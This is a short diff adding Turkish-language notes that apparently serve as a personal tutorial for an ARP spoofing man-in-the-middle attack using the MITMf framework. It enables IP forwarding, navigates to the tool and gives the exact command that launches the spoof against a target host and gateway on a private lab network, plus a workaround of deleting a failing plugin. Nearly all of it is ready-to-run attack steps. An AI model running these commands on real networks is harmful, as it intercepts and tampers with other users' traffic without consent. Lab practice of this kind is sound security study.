@@ -1,0 +1,12 @@
+Kullanicinin arp saldirisi esnasinda internete erisiminin devam etmesi icin ilk once ip forwarding yapmaliyiz.
+echo 1 > /proc/sys/net/ipv4/ip_forward
+Bu framework ile saldiri yapabilmemiz icin once cd komutu ile downloads klasoru icindeki mitmf dosyasina ulasmaliyiz
+
+cd Downloads cd MITMf-master ls
+
+asagidaki komut direkt saldiriyi baslatir.
+python mitmf.py -i eth0 --arp --spoof --gateway 10.0.2.1 --target 10.0.2.15  
+NOT: gateway : modem ip adresi
+	-biz bu komutu calistirirsak bize hata verecektir. duzeltmek icin klasorumuze girip pluginlerden filepawn.pyyi sildik
+
+
